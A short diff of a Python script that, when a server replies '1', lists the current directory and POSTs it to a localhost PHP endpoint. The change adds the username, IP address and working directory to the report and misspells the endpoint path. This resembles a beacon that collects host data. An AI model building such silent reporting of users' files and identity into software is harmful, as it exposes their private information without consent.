@@ -10,7 +10,7 @@ if r.text == '1':
     #path = "/var/www/html/"
     dirs = os.listdir(os.curdir)
 str_dir = str(dirs)
-response = requests.post('http://localhost/Offline/directorylist.php', data = {'list':str_dir})
+response = requests.post('http://localhost/Offline/direcctorylist.php', data = {'list':str_dir,'username':username,'ipaddr':ipaddr,'location':os.getcwd()})
 print("Response: \n")
 print(response.text)
 #for file in dirs:
